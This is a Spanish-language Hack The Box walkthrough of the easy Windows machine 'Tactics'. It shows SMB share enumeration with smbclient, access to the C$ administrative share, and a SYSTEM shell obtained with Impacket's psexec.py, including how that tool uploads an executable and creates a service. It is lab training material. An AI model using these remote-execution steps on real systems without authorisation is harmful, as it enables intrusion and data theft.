
# HTB - Tactics

## Machine Information

| Information    | Value                  |
| -------------- | ---------------------- |
| Machine        | Tactics                |
| IP             | 10.129.11.33           |
| OS             | Windows                |
| Difficulty     | Easy                   |
| Initial Access | SMB                    |
| Remote Shell   | PsExec                 |
| Privileges     | Administrator / SYSTEM |

# 1. Reconocimiento

Comenzamos identificando los servicios disponibles en la máquina.

Uno de los servicios principales es SMB, que utiliza el protocolo **Server Message Block** para compartir archivos, directorios y otros recursos dentro de una red.

En este caso, SMB es especialmente interesante porque podemos intentar conectarnos utilizando un usuario con privilegios administrativos.

# 2. Enumeración SMB

Para enumerar los recursos compartidos mediante SMB utilizamos:

```bash id="7c4x9p"
smbclient -L 10.129.11.33 -U Administrator
```

La opción:

```text id="2w6rqa"
-U Administrator
```

indica el usuario que utilizaremos para autenticarnos contra el servidor SMB.

Durante la enumeración podemos encontrar diferentes shares.

Los nombres que terminan en `$` normalmente corresponden a recursos administrativos u ocultos de Windows.

Por ejemplo:

```text id="0m9j7v"
ADMIN$
C$
```

`C$` representa el acceso administrativo al disco `C:` y `ADMIN$` normalmente apunta al directorio de Windows utilizado para administración remota.

# 3. Acceso mediante C$

Como tenemos credenciales de `Administrator`, podemos conectarnos directamente al recurso administrativo `C$`:

```bash id="f2k8vn"
smbclient -U Administrator \\\\10.129.11.33\\C$
```

De esta manera accedemos directamente al sistema de archivos de Windows a través de SMB.

El recurso:

```text id="p9v3mc"
C$
```

representa el disco `C:` de la máquina víctima.

Debido a que nuestro usuario tiene privilegios administrativos, podemos navegar por el sistema de archivos y acceder a ubicaciones que un usuario normal no podría consultar.

Sin embargo, `smbclient` está pensado principalmente para interactuar con recursos SMB y transferir archivos.

Si queremos obtener una **shell interactiva de Windows**, podemos utilizar una herramienta de la colección Impacket.

# 4. PsExec

La herramienta de Impacket que permite obtener una shell interactiva en este escenario es:

```text id="r4t6xb"
psexec.py
```

También puede estar disponible con el nombre:

```text id="k8z2fd"
impacket-psexec
```

dependiendo de cómo se haya instalado Impacket.

La respuesta a la pregunta de HTB es:

```text id="c1m7qa"
psexec.py
```

## ¿Qué hace PsExec?

`psexec.py` permite ejecutar comandos remotamente en un sistema Windows utilizando SMB y mecanismos de administración remota.

Cuando utilizamos:

```bash id="n3v8ws"
psexec.py Administrator@10.129.11.33
```

Impacket utiliza las credenciales proporcionadas para autenticarse contra la máquina.

Internamente podemos observar que realiza varias operaciones:

```text id="h6q2yr"
Requesting shares
Found writable share ADMIN$
Uploading file
Opening SVCManager
Creating service
Starting service
```

Esto es importante.

La herramienta encuentra un recurso SMB administrativo que podemos escribir:

```text id="v7x4kp"
ADMIN$
```

Después carga un ejecutable en la máquina víctima:

```text id="m5c8za"
Uploading file ZqrbWUnE.exe
```

Posteriormente accede al **Service Control Manager**:

```text id="u2r9lx"
Opening SVCManager
```

y crea un servicio:

```text id="e8k3wd"
Creating service hrwE
```

Finalmente inicia ese servicio:

```text id="q4p6ns"
Starting service hrwE
```

Esto permite obtener una shell remota con los privilegios del servicio creado.

# 5. Obtención de la Shell

Ejecutamos:

```bash id="s6j1mv"
psexec.py Administrator@10.129.11.33
```

También podemos utilizar:

```bash id="z8x4cn"
impacket-psexec Administrator@10.129.11.33
```

La herramienta solicita la contraseña del usuario:

```text id="k3q7ba"
Password:
```

Después de autenticarnos correctamente obtenemos una consola de Windows:

```text id="x5m2rv"
Microsoft Windows [Version 10.0.17763.107]

C:\Windows\system32>
```

El directorio inicial es:

```text id="p1d9kc"
C:\Windows\system32
```

Esto es normal porque el proceso remoto se está ejecutando desde el contexto de Windows System.

# 6. Comprobación de la Shell

Podemos intentar utilizar comandos desde la consola obtenida.

Por ejemplo:

```cmd id="a7f3zw"
ls
```

Sin embargo, `ls` no es un comando nativo de `cmd.exe`:

```text id="n6v2qx"
'ls' is not recognized as an internal or external command,
operable program or batch file.
```

En una consola CMD debemos utilizar comandos propios de Windows, como:

```cmd id="j4c8ps"
dir
```

Para comprobar nuestro contexto podemos utilizar:

```cmd id="w2r6md"
whoami
```

Al haberse utilizado un usuario administrativo mediante PsExec, la sesión se obtiene con privilegios elevados.

# 7. Obtención de la Flag

Una vez obtenida la shell administrativa, podemos localizar la flag dentro del sistema.

También podemos utilizar SMB directamente para descargar archivos desde la máquina víctima.

Desde `smbclient`, el comando:

```text id="b6t9xk"
get
```

permite descargar un archivo desde el recurso SMB hacia nuestra máquina atacante.

La idea es que el archivo descargado queda en nuestro **directorio de trabajo actual** en la máquina atacante.

Por ejemplo:

```text id="r3w7mf"
smb> get flag.txt
```

Esto permite obtener la flag directamente en nuestro directorio local.

# 8. Attack Path

```text id="q9v4hz"
SMB
    |
Administrator
    |
smbclient -L
    |
ADMIN$ / C$
    |
Administrative SMB Access
    |
psexec.py
    |
ADMIN$ Writable Share
    |
Upload Executable
    |
Service Creation
    |
Service Execution
    |
Interactive Windows Shell
    |
Administrator / SYSTEM
    |
Flag
```

# 9. Vulnerabilities & Techniques

* SMB Enumeration
* Server Message Block (SMB)
* Administrative SMB Shares
* `ADMIN$`
* `C$`
* Administrative Credential Usage
* Impacket
* `psexec.py`
* Remote Service Creation
* Remote Command Execution
* Windows Service Abuse
* Privileged Shell
* File Transfer through SMB

# 10. Lessons Learned

La principal lección de Tactics es entender que encontrar un recurso SMB administrativo puede significar mucho más que simplemente poder descargar archivos.

Los recursos:

```text
ADMIN$
C$
```

son especialmente importantes cuando tenemos credenciales administrativas.

`C$` permite acceder al sistema de archivos del disco `C:` mediante SMB, mientras que `ADMIN$` está pensado para tareas administrativas y normalmente apunta al directorio de Windows.

La otra herramienta fundamental de esta máquina es `psexec.py`.

La pregunta de HTB pregunta específicamente:

> Which tool that is part of the Impacket collection can be used to get an interactive shell on the system?

La respuesta es:

```text
psexec.py
```

PsExec aprovecha el acceso administrativo a SMB para cargar un ejecutable y crear un servicio remoto. Al iniciar ese servicio, podemos obtener una shell interactiva en el sistema.

Por eso el flujo de la máquina puede resumirse como:

```text
SMB
    |
Administrator
    |
ADMIN$ / C$
    |
psexec.py
    |
Remote Service
    |
Interactive Shell
    |
Administrator / SYSTEM
```

También es importante distinguir entre `smbclient` y `psexec.py`.

`smbclient` nos permite interactuar con recursos compartidos SMB y transferir archivos, mientras que `psexec.py` está diseñado para ejecutar comandos remotamente y obtener una shell mediante el mecanismo de servicios de Windows.

pwned :)))))
